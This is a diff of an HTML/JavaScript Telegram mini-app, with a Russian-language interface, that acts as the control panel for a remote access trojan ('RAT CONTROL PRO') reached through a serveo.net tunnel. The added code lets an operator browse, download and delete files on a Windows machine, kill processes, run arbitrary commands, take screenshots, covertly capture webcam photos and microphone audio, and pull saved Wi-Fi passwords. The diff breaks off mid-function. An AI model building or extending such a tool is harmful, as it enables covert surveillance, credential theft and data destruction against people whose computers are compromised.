@@ -2,106 +2,1074 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>RAT Control</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            padding: 20px;
-            background: #f0f0f0;
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{
+            font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
+            background:#f5f5f5;
+            color:#333;
+            padding:12px 12px 70px
         }
-        .status {
-            padding: 10px;
-            margin: 10px 0;
-            border-radius: 5px;
+        .header{
+            background:#0088cc;
+            color:#fff;
+            margin:-12px -12px 15px;
+            padding:15px 12px;
+            border-radius:0 0 15px 15px
         }
-        button {
-            padding: 10px 20px;
-            margin: 5px;
+        .header h1{font-size:20px;margin-bottom:3px}
+        .header p{font-size:12px;opacity:.9}
+        .stats-row{
+            display:flex;
+            justify-content:space-between;
+            margin-top:10px;
+            background:rgba(255,255,255,.15);
+            padding:8px;
+            border-radius:10px
+        }
+        .stat-item{text-align:center;flex:1}
+        .stat-value{font-size:14px;font-weight:700}
+        .stat-label{font-size:9px;opacity:.8}
+        .connection-bar{
+            background:#fff;
+            border-radius:10px;
+            padding:10px;
+            margin-bottom:10px;
+            display:flex;
+            gap:8px
+        }
+        .connection-input{
+            flex:1;
+            padding:10px;
+            border:1px solid #ddd;
+            border-radius:8px;
+            font-size:13px
+        }
+        .connection-btn{
+            background:#0088cc;
+            color:#fff;
+            border:none;
+            border-radius:8px;
+            padding:10px 15px;
+            cursor:pointer
+        }
+        .connection-status{
+            font-size:12px;
+            padding:5px;
+            text-align:center;
+            margin-bottom:10px
+        }
+        .tabs{
+            display:flex;
+            gap:5px;
+            margin-bottom:15px;
+            overflow-x:auto;
+            padding:2px
+        }
+        .tab{
+            flex:0 0 auto;
+            background:#fff;
+            padding:8px 15px;
+            border-radius:20px;
+            font-size:12px;
+            font-weight:500;
+            box-shadow:0 2px 3px rgba(0,0,0,.05);
+            cursor:pointer;
+            white-space:nowrap
+        }
+        .tab.active{
+            background:#0088cc;
+            color:#fff
+        }
+        .tab-content{display:none}
+        .tab-content.active{display:block}
+        .card{
+            background:#fff;
+            border-radius:12px;
+            padding:12px;
+            margin-bottom:12px;
+            box-shadow:0 2px 5px rgba(0,0,0,.05)
+        }
+        .card-title{
+            font-size:14px;
+            font-weight:600;
+            margin-bottom:10px;
+            color:#0088cc;
+            display:flex;
+            align-items:center;
+            gap:5px
+        }
+        .grid-2{
+            display:grid;
+            grid-template-columns:repeat(2,1fr);
+            gap:8px;
+            margin-bottom:8px
+        }
+        .grid-3{
+            display:grid;
+            grid-template-columns:repeat(3,1fr);
+            gap:6px;
+            margin-bottom:6px
+        }
+        .btn{
+            border:none;
+            border-radius:8px;
+            padding:12px 5px;
+            font-size:12px;
+            font-weight:500;
+            background:#f0f0f0;
+            color:#333;
+            width:100%;
+            cursor:pointer;
+            transition:all 0.2s
+        }
+        .btn:active{transform:scale(0.98)}
+        .btn-primary{background:#0088cc;color:#fff}
+        .btn-success{background:#28a745;color:#fff}
+        .btn-warning{background:#ffc107;color:#333}
+        .btn-danger{background:#dc3545;color:#fff}
+        .btn-info{background:#17a2b8;color:#fff}
+        .btn-purple{background:#6f42c1;color:#fff}
+        .output{
+            background:#1a1a1a;
+            color:#0f0;
+            border-radius:8px;
+            padding:12px;
+            font-size:12px;
+            font-family:monospace;
+            line-height:1.5;
+            max-height:300px;
+            overflow-y:auto;
+            margin:8px 0;
+            white-space:pre-wrap;
+            border:1px solid #333
+        }
+        .modal{
+            position:fixed;
+            top:0;left:0;right:0;bottom:0;
+            background:rgba(0,0,0,.95);
+            display:flex;
+            justify-content:center;
+            align-items:center;
+            z-index:10000
+        }
+        .modal img{
+            max-width:90%;
+            max-height:90%;
+            border-radius:10px;
+            box-shadow:0 0 30px rgba(0,0,0,.5)
+        }
+        .modal-close{
+            position:absolute;
+            top:20px;right:20px;
+            color:#fff;
+            font-size:30px;
+            cursor:pointer;
+            width:40px;height:40px;
+            background:rgba(255,255,255,.2);
+            border-radius:50%;
+            display:flex;
+            justify-content:center;
+            align-items:center
+        }
+        .quick-paths{
+            display:flex;
+            gap:5px;
+            overflow-x:auto;
+            padding:5px 0;
+            margin:8px 0
+        }
+        .path-chip{
+            background:#f0f0f0;
+            padding:6px 12px;
+            border-radius:15px;
+            font-size:11px;
+            white-space:nowrap;
+            cursor:pointer
+        }
+        .path-bar{
+            background:#f8f9fa;
+            border:1px solid #ddd;
+            border-radius:8px;
+            padding:10px;
+            margin:8px 0;
+            font-size:12px;
+            word-break:break-all
+        }
+        .input-group{
+            display:flex;
+            gap:5px;
+            margin:8px 0
+        }
+        .input{
+            flex:1;
+            padding:10px;
+            border:1px solid #ddd;
+            border-radius:8px;
+            font-size:12px
+        }
+        .file-list{
+            max-height:300px;
+            overflow-y:auto;
+            border:1px solid #ddd;
+            border-radius:8px;
+            margin-top:8px;
+            background:#fff
+        }
+        .file-item{
+            display:flex;
+            align-items:center;
+            padding:10px;
+            border-bottom:1px solid #eee;
+            font-size:12px;
+            cursor:pointer;
+            transition:background 0.2s
+        }
+        .file-item:hover{background:#f0f0f0}
+        .file-icon{font-size:16px;margin-right:10px;width:24px}
+        .file-name{flex:1;word-break:break-all}
+        .file-size{color:#666;margin-right:10px;font-size:11px}
+        .file-date{color:#666;font-size:11px}
+        .file-hidden{opacity:0.6;background:#fafafa}
+        .status{
+            position:fixed;
+            bottom:80px;left:10px;right:10px;
+            background:#333;
+            color:#fff;
+            padding:10px 15px;
+            border-radius:20px;
+            font-size:12px;
+            text-align:center;
+            display:none;
+            z-index:1000;
+            box-shadow:0 2px 10px rgba(0,0,0,.3)
+        }
+        .status.show{display:block}
+        .bottom-bar{
+            position:fixed;
+            bottom:0;left:0;right:0;
+            background:#fff;
+            padding:8px 12px;
+            border-top:1px solid #ddd;
+            display:flex;
+            justify-content:space-between;
+            align-items:center;
+            font-size:11px
+        }
+        .bottom-bar button{
+            background:#0088cc;
+            color:#fff;
+            border:none;
+            border-radius:15px;
+            padding:6px 15px;
+            font-size:11px;
+            cursor:pointer
+        }
+        .online-dot{
+            width:8px;height:8px;
+            background:#28a745;
+            border-radius:50%;
+            display:inline-block;
+            margin-right:4px;
+            animation:pulse 2s infinite
+        }
+        @keyframes pulse{
+            0%{opacity:1;transform:scale(1)}
+            50%{opacity:0.6;transform:scale(1.2)}
+            100%{opacity:1;transform:scale(1)}
+        }
+        
+        /* Стили для медиатеки */
+        .media-section {
+            margin: 20px 0;
+            padding: 15px;
+            background: #f8f9fa;
+            border-radius: 10px;
+        }
+        .section-title {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+            font-weight: 600;
+            color: #333;
+        }
+        .media-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
+            gap: 10px;
+            margin-top: 10px;
+        }
+        .media-item {
+            background: white;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+        .media-item:hover {
+            transform: scale(1.05);
+        }
+        .media-item img {
+            width: 100%;
+            height: 90px;
+            object-fit: cover;
+        }
+        .media-item audio {
+            width: 100%;
+            height: 40px;
+            margin-top: 5px;
+        }
+        .media-info {
+            padding: 8px;
+            font-size: 10px;
+            color: #666;
+            text-align: center;
+            background: #fafafa;
+        }
+        .media-empty {
+            text-align: center;
+            padding: 30px;
+            color: #999;
+            font-style: italic;
+            background: white;
+            border-radius: 8px;
+            grid-column: 1 / -1;
+        }
+        .badge {
             background: #0088cc;
             color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-        #output {
-            background: #1a1a1a;
-            color: #0f0;
-            padding: 15px;
-            border-radius: 5px;
-            margin-top: 20px;
-            white-space: pre-wrap;
-            font-family: monospace;
+            padding: 2px 8px;
+            border-radius: 12px;
+            font-size: 11px;
         }
     </style>
 </head>
 <body>
-    <h1>🤖 RAT CONTROL</h1>
-    
-    <div>
-        <input type="text" id="serverIP" value="ratcontrol.serveousercontent.com" style="width: 300px; padding: 10px;">
-        <button onclick="testConnection()">Подключиться</button>
+    <div class="header">
+        <h1>🤖 RAT CONTROL PRO</h1>
+        <p>Полное управление компьютером</p>
+        <div class="stats-row" id="quickStats">
+            <div class="stat-item"><span class="stat-value" id="statCPU">0%</span><div class="stat-label">CPU</div></div>
+            <div class="stat-item"><span class="stat-value" id="statRAM">0%</span><div class="stat-label">RAM</div></div>
+            <div class="stat-item"><span class="stat-value" id="statDISK">0%</span><div class="stat-label">Диск</div></div>
+            <div class="stat-item"><span class="stat-value" id="statPROC">0</span><div class="stat-label">Процессы</div></div>
+        </div>
     </div>
-    
-    <div id="connectionStatus" class="status"></div>
-    
-    <button onclick="sendCommand('system')">Информация</button>
-    <button onclick="sendCommand('cpu')">CPU</button>
-    <button onclick="sendCommand('memory')">RAM</button>
-    
-    <div id="output"></div>
+
+    <!-- Подключение -->
+    <div class="connection-bar">
+        <input type="text" id="serverIP" class="connection-input" placeholder="Адрес сервера" value="ratcontrol.serveo.net">
+        <button class="connection-btn" onclick="testConnection()">🔄</button>
+    </div>
+    <div id="connectionStatus" class="connection-status">⏳ Проверка...</div>
+
+    <!-- Вкладки -->
+    <div class="tabs">
+        <div class="tab active" onclick="switchTab('main')">📊 Главная</div>
+        <div class="tab" onclick="switchTab('system')">⚙️ Система</div>
+        <div class="tab" onclick="switchTab('files')">📁 Файлы</div>
+        <div class="tab" onclick="switchTab('processes')">📋 Процессы</div>
+        <div class="tab" onclick="switchTab('media')">🎥 Медиатека</div>
+        <div class="tab" onclick="switchTab('network')">🌐 Сеть</div>
+        <div class="tab" onclick="switchTab('power')">⚡ Питание</div>
+    </div>
+
+    <!-- Главная -->
+    <div id="tab-main" class="tab-content active">
+        <div class="card">
+            <div class="card-title">📊 БЫСТРАЯ ИНФОРМАЦИЯ</div>
+            <button class="btn btn-primary" onclick="sendCommand('system')">🔄 Обновить всё</button>
+            <div id="systemOutput" class="output">Нажмите кнопку</div>
+        </div>
+
+        <div class="card">
+            <div class="card-title">⚡ БЫСТРЫЕ ДЕЙСТВИЯ</div>
+            <div class="grid-3">
+                <button class="btn btn-info" onclick="takeScreenshot()">📸 Скрин</button>
+                <button class="btn btn-warning" onclick="sendCommand('lock')">🔒 Блок</button>
+                <button class="btn btn-danger" onclick="sendCommand('shutdown')">⏻ Выкл</button>
+                <button class="btn btn-success" onclick="sendCommand('restart')">🔄 Рестарт</button>
+                <button class="btn btn-purple" onclick="sendCommand('processes')">📋 Процессы</button>
+                <button class="btn" onclick="quickCmd('dir')">📁 Dir</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Система -->
+    <div id="tab-system" class="tab-content">
+        <div class="card">
+            <div class="card-title">🖥️ СИСТЕМА</div>
+            <div class="grid-2">
+                <button class="btn btn-primary" onclick="sendCommand('system')">📊 Полная</button>
+                <button class="btn btn-info" onclick="sendCommand('cpu')">⚙️ CPU</button>
+                <button class="btn btn-success" onclick="sendCommand('memory')">💾 RAM</button>
+                <button class="btn btn-warning" onclick="sendCommand('disk')">💿 Диски</button>
+            </div>
+            <div id="systemDetailOutput" class="output"></div>
+        </div>
+    </div>
+
+    <!-- Файлы -->
+    <div id="tab-files" class="tab-content">
+        <div class="card">
+            <div class="card-title">📁 ФАЙЛОВЫЙ МЕНЕДЖЕР</div>
+            
+            <div class="quick-paths">
+                <span class="path-chip" onclick="quickPath('C:\\')">💽 C:\</span>
+                <span class="path-chip" onclick="quickPath('D:\\')">💽 D:\</span>
+                <span class="path-chip" onclick="quickPath('%USERPROFILE%')">👤 Домой</span>
+                <span class="path-chip" onclick="quickPath('%USERPROFILE%\\Desktop')">🖥️ Рабочий стол</span>
+                <span class="path-chip" onclick="quickPath('%USERPROFILE%\\Downloads')">📥 Загрузки</span>
+            </div>
+
+            <div style="display: flex; gap: 5px; margin: 8px 0;">
+                <div class="path-bar" id="currentPath" style="flex: 1; margin: 0;">C:\</div>
+                <button class="btn btn-info" onclick="copyPath()" style="width: auto; padding: 10px 15px;" title="Копировать путь">📋</button>
+            </div>
+            
+            <div class="grid-3">
+                <button class="btn btn-primary" onclick="listFiles()">📋 Список</button>
+                <button class="btn btn-warning" onclick="goBack()">⬆️ Назад</button>
+                <button class="btn btn-info" onclick="refreshFiles()">🔄 Обновить</button>
+            </div>
+
+            <div class="input-group">
+                <input type="text" id="folderPath" class="input" placeholder="Введите путь">
+                <button class="btn btn-primary" onclick="changeDir()">Перейти</button>
+            </div>
+
+            <div class="input-group">
+                <input type="text" id="fileName" class="input" placeholder="Имя файла">
+                <button class="btn btn-success" onclick="downloadFile()">📥 Скачать</button>
+                <button class="btn btn-danger" onclick="deleteFile()">🗑️ Удалить</button>
+            </div>
+
+            <div id="fileList" class="file-list"></div>
+            <div id="fileStats" style="font-size: 11px; color: #666; margin-top: 5px; text-align: right;"></div>
+        </div>
+    </div>
+
+    <!-- Процессы -->
+    <div id="tab-processes" class="tab-content">
+        <div class="card">
+            <div class="card-title">📋 МЕНЕДЖЕР ПРОЦЕССОВ</div>
+            
+            <div class="grid-3">
+                <button class="btn btn-primary" onclick="sendCommand('processes')">📊 Все</button>
+                <button class="btn btn-info" onclick="sendCommand('topcpu')">⚡ По CPU</button>
+                <button class="btn btn-success" onclick="sendCommand('topram')">💾 По RAM</button>
+            </div>
+
+            <div class="input-group">
+                <input type="number" id="killPid" class="input" placeholder="PID">
+                <button class="btn btn-danger" onclick="killProcess()">🔪 Убить</button>
+            </div>
+
+            <div id="processesOutput" class="output"></div>
+        </div>
+    </div>
+
+    <!-- Медиатека -->
+    <div id="tab-media" class="tab-content">
+        <div class="card">
+            <div class="card-title">🎥 МЕДИАТЕКА</div>
+            
+            <div class="grid-3">
+                <button class="btn btn-primary" onclick="takeScreenshot()">📸 Скриншот</button>
+                <button class="btn btn-info" onclick="takeWebcamPhoto()">📷 Фото с вебки</button>
+                <button class="btn btn-success" onclick="startRecording()">🎤 Записать звук</button>
+            </div>
+            
+            <div class="media-section">
+                <div class="section-title">
+                    <span>📸 СКРИНШОТЫ</span>
+                    <span class="badge" id="screenshotsCount">0</span>
+                </div>
+                <div id="screenshotsList" class="media-grid">
+                    <div class="media-empty">Нет скриншотов</div>
+                </div>
+            </div>
+            
+            <div class="media-section">
+                <div class="section-title">
+                    <span>📷 ФОТО С ВЕБКИ</span>
+                    <span class="badge" id="webcamCount">0</span>
+                </div>
+                <div id="webcamList" class="media-grid">
+                    <div class="media-empty">Нет фото</div>
+                </div>
+            </div>
+            
+            <div class="media-section">
+                <div class="section-title">
+                    <span>🎤 АУДИОЗАПИСИ</span>
+                    <span class="badge" id="audioCount">0</span>
+                </div>
+                <div id="audioList" class="media-grid">
+                    <div class="media-empty">Нет записей</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Сеть -->
+    <div id="tab-network" class="tab-content">
+        <div class="card">
+            <div class="card-title">🌐 СЕТЬ</div>
+            <div class="grid-2">
+                <button class="btn btn-primary" onclick="sendCommand('network')">📡 Локальная</button>
+                <button class="btn btn-info" onclick="sendCommand('externalip')">🌍 Внешняя</button>
+                <button class="btn btn-success" onclick="sendCommand('wifi')">📶 Wi-Fi</button>
+            </div>
+            <div id="networkOutput" class="output"></div>
+        </div>
+    </div>
+
+    <!-- Питание -->
+    <div id="tab-power" class="tab-content">
+        <div class="card">
+            <div class="card-title">⚡ УПРАВЛЕНИЕ ПИТАНИЕМ</div>
+            <div class="grid-2">
+                <button class="btn btn-danger" onclick="sendCommand('shutdown')">⏻ Выключить</button>
+                <button class="btn btn-warning" onclick="sendCommand('restart')">🔄 Перезагрузить</button>
+                <button class="btn btn-info" onclick="sendCommand('lock')">🔒 Блокировка</button>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="card-title">💻 КОМАНДЫ</div>
+            <div class="input-group">
+                <input type="text" id="customCmd" class="input" placeholder="Введите команду">
+                <button class="btn btn-primary" onclick="runCustomCommand()">Выполнить</button>
+            </div>
+            <div id="cmdOutput" class="output"></div>
+        </div>
+    </div>
+
+    <div id="status" class="status"></div>
+
+    <div class="bottom-bar">
+        <span><span class="online-dot"></span> <span id="connectionText">Офлайн</span></span>
+        <button onclick="window.Telegram.WebApp.close()">ЗАКРЫТЬ</button>
+    </div>
 
     <script>
-        const PROXY_URL = 'https://api.allorigins.win/raw?url=';
-        
-        function getProxiedUrl(endpoint) {
-            const server = document.getElementById('serverIP').value;
-            const cleanServer = server.replace('https://', '').replace('http://', '').split(':')[0];
-            const targetUrl = `http://${cleanServer}${endpoint}`;
-            return PROXY_URL + encodeURIComponent(targetUrl);
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+
+        // Настройки
+        let serverAddress = localStorage.getItem('serverAddr') || 'ratcontrol.serveo.net';
+        let currentDir = 'C:\\';
+        document.getElementById('serverIP').value = serverAddress;
+
+        // ==================== ОСНОВНЫЕ ФУНКЦИИ ====================
+        function getBaseUrl() {
+            let cleanAddress = serverAddress.split(':')[0];
+            let port = serverAddress.includes(':') ? ':' + serverAddress.split(':')[1] : '';
+            return `https://${cleanAddress}${port}`;
         }
 
+        function showStatus(text, type = 'info') {
+            const s = document.getElementById('status');
+            s.textContent = text;
+            s.className = 'status show';
+            s.style.background = type === 'error' ? '#dc3545' : type === 'success' ? '#28a745' : '#ffc107';
+            setTimeout(() => s.classList.remove('show'), 2000);
+        }
+
+        async function apiRequest(endpoint, method = 'GET', data = null) {
+            try {
+                const url = getBaseUrl() + endpoint;
+                console.log('📤 Запрос к:', url);
+                
+                const opts = { 
+                    method, 
+                    headers: {},
+                    mode: 'cors'
+                };
+                
+                if (data) {
+                    opts.headers['Content-Type'] = 'application/json';
+                    opts.body = JSON.stringify(data);
+                }
+                
+                const res = await fetch(url, opts);
+                if (!res.ok) throw new Error(`HTTP ${res.status}`);
+                
+                if (endpoint.includes('screenshot') || endpoint.includes('webcam') || endpoint.includes('record_audio')) {
+                    return await res.blob();
+                }
+                
+                return await res.json();
+            } catch (e) {
+                console.error('❌ Ошибка API:', e);
+                showStatus('❌ ' + e.message, 'error');
+                throw e;
+            }
+        }
+
+        async function sendCommand(cmd, params = {}) {
+            showStatus('⏳ Отправка...');
+            try {
+                const data = await apiRequest('/api/command', 'POST', { command: cmd, params });
+                
+                if (data && data.success) {
+                    showStatus('✅ OK', 'success');
+                    
+                    if (cmd === 'system') {
+                        document.getElementById('systemOutput').innerHTML = formatSystem(data.data);
+                        document.getElementById('systemDetailOutput').innerHTML = formatSystem(data.data);
+                        updateStats(data.data);
+                    } else if (cmd === 'network') {
+                        document.getElementById('networkOutput').innerHTML = formatNetwork(data.data);
+                    } else if (cmd === 'externalip') {
+                        document.getElementById('networkOutput').innerHTML = formatExternalIP(data.data);
+                    } else if (cmd === 'wifi') {
+                        document.getElementById('networkOutput').innerHTML = formatWiFi(data.data);
+                    } else if (cmd === 'processes') {
+                        document.getElementById('processesOutput').innerHTML = formatProcesses(data.data);
+                    } else if (cmd === 'topcpu' || cmd === 'topram') {
+                        document.getElementById('processesOutput').innerHTML = formatProcesses(data.data);
+                    } else if (cmd === 'memory' || cmd === 'ram') {
+                        document.getElementById('systemDetailOutput').innerHTML = formatMemory(data.data);
+                    } else if (cmd === 'disk') {
+                        document.getElementById('systemDetailOutput').innerHTML = formatDisk(data.data);
+                    } else if (cmd === 'cpu') {
+                        document.getElementById('systemDetailOutput').innerHTML = formatCPU(data.data);
+                    } else if (cmd === 'cmd') {
+                        document.getElementById('cmdOutput').innerHTML = data.output || '✅ Команда выполнена';
+                    }
+                    
+                    return data.data;
+                } else {
+                    showStatus('❌ ' + (data?.error || 'Ошибка'), 'error');
+                }
+            } catch (e) {
+                return null;
+            }
+        }
+
+        function updateStats(data) {
+            if (data) {
+                document.getElementById('statCPU').textContent = data.cpu + '%';
+                document.getElementById('statRAM').textContent = data.ram + '%';
+                document.getElementById('statDISK').textContent = data.disk + '%';
+                document.getElementById('statPROC').textContent = data.processes;
+            }
+        }
+
+        function formatSystem(d) {
+            if (!d) return 'Нет данных';
+            return `🖥️ ОС: ${d.os}
+💻 Компьютер: ${d.computer}
+👤 Пользователь: ${d.user}
+⏱️ Запуск: ${d.boot}
+
+⚙️ CPU: ${d.cpu}% (${d.cpu_count} ядер)
+💾 RAM: ${d.ram_used}/${d.ram_total} ГБ (${d.ram}%)
+💿 Диск: ${d.disk_used}/${d.disk_total} ГБ (${d.disk}%)
+🌐 IP: ${d.ip}
+📊 Процессов: ${d.processes}`;
+        }
+
+        function formatMemory(d) {
+            return `💾 ПАМЯТЬ
+═══════════════════
+Всего: ${d.total}
+Использовано: ${d.used} (${d.percent}%)
+Доступно: ${d.available}
+Кешировано: ${d.cached}
+Буфер: ${d.buffers}
+
+🔄 SWAP:
+Всего: ${d.swap_total}
+Использовано: ${d.swap_used} (${d.swap_percent}%)`;
+        }
+
+        function formatDisk(d) {
+            if (!d || !d.length) return 'Нет дисков';
+            return d.map(d => 
+                `💿 ${d.device} (${d.mount})
+   Тип: ${d.fstype}
+   Всего: ${d.total}
+   Использовано: ${d.used} (${d.percent}%)
+   Свободно: ${d.free}`
+            ).join('\n\n');
+        }
+
+        function formatCPU(d) {
+            let result = `⚙️ ПРОЦЕССОР
+═══════════════════
+Ядер: ${d.cores_physical} физических / ${d.cores_logical} логических
+Частота: ${d.freq_current} МГц (макс: ${d.freq_max} МГц)
+Средняя загрузка: ${d.percent_avg.toFixed(1)}%
+
+📊 ПО ЯДРАМ:\n`;
+            
+            d.percent_per_core.forEach((core, i) => {
+                result += `Ядро ${i}: ${core.toFixed(1)}%\n`;
+            });
+            
+            return result;
+        }
+
+        function formatProcesses(list) {
+            if (!list || !list.length) return 'Нет процессов';
+            return list.map(p => 
+                `📊 PID:${p.pid} | ${p.name} | CPU:${p.cpu}% | RAM:${p.ram}%`
+            ).join('\n');
+        }
+
+        function formatNetwork(d) {
+            return `📡 ЛОКАЛЬНАЯ СЕТЬ
+═══════════════════
+💻 Компьютер: ${d.hostname}
+🌐 IP: ${d.local_ip}
+
+📊 ТРАФИК
+Отправлено: ${d.bytes_sent}
+Получено: ${d.bytes_recv}
+Пакетов отправлено: ${d.packets_sent}
+Пакетов получено: ${d.packets_recv}`;
+        }
+
+        function formatExternalIP(d) {
+            return `🌍 ВНЕШНИЙ IP
+═══════════════════
+📍 IP: ${d.ip}
+🏳️ Страна: ${d.country}
+🏙️ Город: ${d.city}
+📡 Провайдер: ${d.isp}`;
+        }
+
+        function formatWiFi(list) {
+            if (!list || !list.length) return '📶 Wi-Fi сети не найдены';
+            return list.map(w => 
+                `📶 ${w.ssid}\n🔑 Пароль: ${w.password}`
+            ).join('\n\n');
+        }
+
+        // ==================== ПОДКЛЮЧЕНИЕ ====================
         async function testConnection() {
-            const statusDiv = document.getElementById('connectionStatus');
-            statusDiv.textContent = '⏳ Проверка...';
+            serverAddress = document.getElementById('serverIP').value;
+            localStorage.setItem('serverAddr', serverAddress);
             
             try {
-                const url = getProxiedUrl('/');
-                const response = await fetch(url);
-                const text = await response.text();
-                
+                const res = await fetch(getBaseUrl() + '/');
+                const text = await res.text();
                 if (text.includes('✅')) {
-                    statusDiv.textContent = '✅ Подключено';
-                    statusDiv.style.color = '#155724';
-                    statusDiv.style.background = '#d4edda';
+                    document.getElementById('connectionStatus').innerText = '✅ Подключено';
+                    document.getElementById('connectionText').innerText = 'Онлайн';
+                    showStatus('✅ Подключено', 'success');
+                    sendCommand('system');
                 } else {
                     throw new Error('Неверный ответ');
                 }
             } catch (e) {
-                statusDiv.textContent = '❌ Ошибка: ' + e.message;
-                statusDiv.style.color = '#721c24';
-                statusDiv.style.background = '#f8d7da';
+                document.getElementById('connectionStatus').innerText = '❌ Нет соединения';
+                document.getElementById('connectionText').innerText = 'Офлайн';
+                showStatus('❌ Ошибка подключения', 'error');
             }
         }
 
-        async function sendCommand(cmd) {
-            const outputDiv = document.getElementById('output');
-            outputDiv.textContent = '⏳ Отправка...';
-            
+        // ==================== ФАЙЛЫ ====================
+        async function listFiles() {
             try {
-                const url = getProxiedUrl('/api/command');
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ command: cmd })
-                });
-                
-                const data = await response.json();
-                outputDiv.textContent = JSON.stringify(data, null, 2);
-            } catch (e) {
-                outputDiv.textContent = '❌ Ошибка: ' + e.message;
+                const data = await apiRequest('/api/files?path=' + encodeURIComponent(currentDir));
+                if (data && data.success) {
+                    currentDir = data.current_dir;
+                    document.getElementById('currentPath').textContent = currentDir;
+                    
+                    let html = '';
+                    if (data.files && data.files.length > 0) {
+                        data.files.slice(0, 50).forEach(f => {
+                            const icon = f.is_dir ? '📁' : '📄';
+                            const hiddenClass = f.hidden ? 'file-hidden' : '';
+                            const safeName = f.name.replace(/'/g, "\\'").replace(/"/g, '&quot;');
+                            
+                            if (f.is_dir) {
+                                html += `<div class="file-item ${hiddenClass}" ondblclick="openFolder('${safeName}')" onclick="selectFile('${safeName}')">
+                                    <span class="file-icon">${icon}</span>
+                                    <span class="file-name">${f.name}</span>
+                                    <span class="file-size">${f.size}</span>
+                                    <span class="file-date">${f.modified}</span>
+                                </div>`;
+                            } else {
+                                html += `<div class="file-item ${hiddenClass}" onclick="selectFile('${safeName}')">
+                                    <span class="file-icon">${icon}</span>
+                                    <span class="file-name">${f.name}</span>
+                                    <span class="file-size">${f.size}</span>
+                                    <span class="file-date">${f.modified}</span>
+                                </div>`;
+                            }
+                        });
+                    } else {
+                        html = '<div class="file-item">📁 Папка пуста</div>';
+                    }
+                    document.getElementById('fileList').innerHTML = html;
+                    document.getElementById('fileStats').innerHTML = `📊 Всего: ${data.total} элементов`;
+                }
+            } catch (error) {
+                document.getElementById('fileList').innerHTML = '<div class="file-item">❌ Ошибка загрузки</div>';
             }
         }
+
+        function openFolder(folderName) {
+            let newPath = currentDir;
+            if (!newPath.endsWith('\\') && !newPath.endsWith('/')) {
+                newPath += '\\';
+            }
+            newPath += folderName;
+            currentDir = newPath;
+            listFiles();
+        }
+
+        async function goBack() {
+            if (currentDir === 'C:\\' || currentDir === 'C:/') {
+                showStatus('📁 Уже в корне', 'warning');
+                return;
+            }
+            
+            const lastSlash = Math.max(currentDir.lastIndexOf('\\'), currentDir.lastIndexOf('/'));
+            if (lastSlash > 0) {
+                if (currentDir.substring(lastSlash - 1, lastSlash + 1) === ':\\') {
+                    currentDir = currentDir.substring(0, lastSlash + 1);
+                } else {
+                    currentDir = currentDir.substring(0, lastSlash);
+                }
+            } else {
+                currentDir = 'C:\\';
+            }
+            
+            await listFiles();
+        }
+
+        function refreshFiles() {
+            listFiles();
+        }
+
+        function quickPath(path) {
+            currentDir = path;
+            listFiles();
+        }
+
+        async function changeDir() {
+            const path = document.getElementById('folderPath').value;
+            if (path) {
+                currentDir = path;
+                await listFiles();
+                document.getElementById('folderPath').value = '';
+            }
+        }
+
+        function selectFile(name) {
+            document.getElementById('fileName').value = name;
+        }
+
+        async function downloadFile() {
+            const name = document.getElementById('fileName').value;
+            if (name) {
+                window.open(getBaseUrl() + '/api/download?path=' + encodeURIComponent(currentDir + '\\' + name), '_blank');
+            }
+        }
+
+        async function deleteFile() {
+            const name = document.getElementById('fileName').value;
+            if (name && confirm('Удалить ' + name + '?')) {
+                await apiRequest('/api/delete', 'POST', { path: currentDir + '\\' + name });
+                listFiles();
+            }
+        }
+
+        function copyPath() {
+            const path = document.getElementById('currentPath').textContent;
+            navigator.clipboard.writeText(path).then(() => {
+                showStatus('✅ Путь скопирован', 'success');
+            }).catch(() => {
+                showStatus('❌ Ошибка копирования', 'error');
+            });
+        }
+
+        // ==================== ПРОЦЕССЫ ====================
+        async function killProcess() {
+            const pid = document.getElementById('killPid').value;
+            if (!pid) {
+                showStatus('❌ Введите PID', 'error');
+                return;
+            }
+            
+            showStatus('⏳ Завершение процесса...');
+            try {
+                const data = await apiRequest('/api/kill', 'POST', { pid: parseInt(pid) });
+                if (data && data.success) {
+                    showStatus('✅ Процесс завершён', 'success');
+                    sendCommand('processes');
+                    document.getElementById('killPid').value = '';
+                } else {
+                    showStatus('❌ ' + (data?.error || 'Ошибка'), 'error');
+                }
+            } catch (error) {
+                showStatus('❌ ' + error.message, 'error');
+            }
+        }
+
+        // ==================== МЕДИАТЕКА ====================
+        async function takeScreenshot() {
+            showStatus('📸 Скриншот...');
+            try {
+                const blob = await apiRequest('/api/screenshot');
+                const url = URL.createObjectURL(blob);
+                showImageModal(url);
+                showStatus('✅ Скриншот готов', 'success');
+                setTimeout(() => refreshMedia(), 1000);
+            } catch { 
+                showStatus('❌ Ошибка', 'error'); 
+            }
+        }
+
+        async function takeWebcamPhoto() {
+            showStatus('📷 Фото...');
+            try {
+                const blob = await apiRequest('/api/webcam');
+                const url = URL.createObjectURL(blob);
+                showImageModal(url);
+                showStatus('✅ Фото готово', 'success');
+                setTimeout(() => refreshMedia(), 1000);
+            } catch { 
+                showStatus('❌ Ошибка', 'error'); 
+            }
+        }
+
+        async function startRecording() {
+            showStatus('⏳ Запись звука (5 сек)...', 'warning');
+            try {
+                const blob = await apiRequest('/api/record_audio');
+                const url = URL.createObjectURL(blob);
+                
+                const modal = document.createElement('div');
+                modal.className = 'modal';
+                modal.innerHTML = `
+                    <div style="background: white; padding: 20px; border-radius: 10px; max-width: 400px;">
+                        <h3 style="margin-bottom: 15px;">🎤 Запись готова</h3>
